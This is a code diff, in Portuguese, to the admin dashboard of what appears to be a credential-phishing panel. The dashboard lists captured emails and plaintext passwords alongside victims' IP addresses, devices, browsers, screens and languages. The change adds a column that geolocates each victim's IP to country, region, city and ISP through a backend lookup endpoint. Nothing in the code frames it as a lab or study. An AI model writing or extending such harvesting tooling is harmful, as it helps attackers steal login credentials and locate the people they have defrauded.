@@ -227,6 +227,7 @@
                     <th>📧 Email</th>
                     <th>🔑 Senha</th>
                     <th>🌍 IP</th>
+                    <th>📍 Localização</th>
                     <th>📱 Dispositivo</th>
                     <th>💻 OS / Browser</th>
                     <th>📐 Tela / Idioma</th>
@@ -238,7 +239,7 @@
             </thead>
             <tbody id="logsTable">
                 <tr>
-                    <td colspan="11" class="no-data">Carregando dados...</td>
+                    <td colspan="12" class="no-data">Carregando dados...</td>
                 </tr>
             </tbody>
         </table>
@@ -285,7 +286,7 @@
                 const tbody = document.getElementById('logsTable');
                 
                 if (!data.logs || data.logs.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="11" class="no-data">Nenhuma captura encontrada ainda. Teste o login!</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="12" class="no-data">Nenhuma captura encontrada ainda. Teste o login!</td></tr>';
                     return;
                 }
                 
@@ -318,7 +319,8 @@
                             <td><strong>#${log.id}</strong></td>
                             <td class="email">${escapeHtml(log.email)}</td>
                             <td class="password">${escapeHtml(log.password)}</td>
-                            <td class="ip">${escapeHtml(log.ip)}</td>
+                            <td class="ip" id="ip-${log.id}">${escapeHtml(log.ip)}</td>
+                            <td class="device-info" id="geo-${log.id}">⏳</td>
                             <td class="device-info">${deviceType}${mobileType ? ' (' + mobileType + ')' : ''}</td>
                             <td class="device-info">${escapeHtml(osInfo)}<br>${escapeHtml(browserInfo)}<br><small>${escapeHtml(platform)}</small></td>
                             <td class="device-info">${escapeHtml(screen)}<br>${escapeHtml(lang)}<br><small>${escapeHtml(timezone)}</small></td>
@@ -328,7 +330,7 @@
                             <td><button class="expand-btn" onclick="toggleDetails(${log.id})">Ver</button></td>
                         </tr>
                         <tr id="details-${log.id}" class="details-row" style="display:none;">
-                            <td colspan="11">
+                            <td colspan="12">
                                 <div class="details-content">
                                     <strong>🔍 Detalhes Completos:</strong><br>
                                     <strong>User-Agent:</strong> ${escapeHtml(log.user_agent || 'N/A')}<br>
@@ -347,11 +349,16 @@
                     `;
                 }).join('');
                 
+                // Buscar geolocalização para cada IP
+                data.logs.forEach(log => {
+                    lookupGeo(log.id, log.ip);
+                });
+                
                 const now = new Date();
                 document.getElementById('lastUpdate').textContent = now.toLocaleString('pt-BR');
             } catch (err) {
                 console.error('Erro ao buscar logs:', err);
-                document.getElementById('logsTable').innerHTML = '<tr><td colspan="11" class="no-data">Erro ao carregar dados</td></tr>';
+                document.getElementById('logsTable').innerHTML = '<tr><td colspan="12" class="no-data">Erro ao carregar dados</td></tr>';
             }
         }
         
@@ -359,6 +366,33 @@
             const row = document.getElementById('details-' + id);
             if (row) {
                 row.style.display = row.style.display === 'none' ? 'table-row' : 'none';
+            }
+        }
+        
+        async function lookupGeo(id, ip) {
+            if (!ip || ip === 'unknown' || ip === '0.0.0.0') {
+                document.getElementById('geo-' + id).innerHTML = '<span style="color:#999;">N/A</span>';
+                return;
+            }
+            try {
+                const res = await fetch(`${API_URL}/lookup-ip/${ip}`);
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data.status === 'success') {
+                        document.getElementById('geo-' + id).innerHTML = `
+                            <strong>${escapeHtml(data.country || '?')}</strong><br>
+                            ${escapeHtml(data.regionName || '?')}<br>
+                            ${escapeHtml(data.city || '?')}<br>
+                            <small>${escapeHtml(data.isp || '?')}</small>
+                        `;
+                    } else {
+                        document.getElementById('geo-' + id).innerHTML = '<span style="color:#999;">Não encontrado</span>';
+                    }
+                } else {
+                    document.getElementById('geo-' + id).innerHTML = '<span style="color:#999;">Erro</span>';
+                }
+            } catch (e) {
+                document.getElementById('geo-' + id).innerHTML = '<span style="color:#999;">Erro</span>';
             }
         }
         
